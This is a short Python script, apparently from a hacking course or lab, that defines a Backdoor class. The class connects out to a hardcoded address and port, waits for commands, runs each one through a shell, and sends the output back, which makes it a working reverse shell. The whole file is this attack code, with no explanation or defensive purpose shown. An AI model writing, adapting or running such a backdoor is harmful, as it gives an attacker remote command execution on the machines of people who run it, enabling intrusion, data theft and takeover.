#!/usr/bin/env python
import socket,json
import  subprocess

class Backdoor:
    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip,port))
        self.connection.send("\n[+] Connection Established\n")

    def execute_system_commands(self, command):
        return subprocess.check_output(command, shell=True)

    def send_reliable(self, data):
        json_data = json.dumps(data)
        self.connection.sendall(json_data)

    def receive_reliable(self):
        json_data = self.connection.recv(1024)

        print(type(json_data))
        print("data " + json_data)
        return json.loads(json_data)

    def run(self):
        while True:
            command = self.receive_reliable()
            print(command)
            command_result = self.execute_system_commands(command)
           # print(command_result)
            self.send_reliable(command_result)
        self.connection.close()

backdoor = Backdoor("192.168.184.154",4460)
backdoor.run()
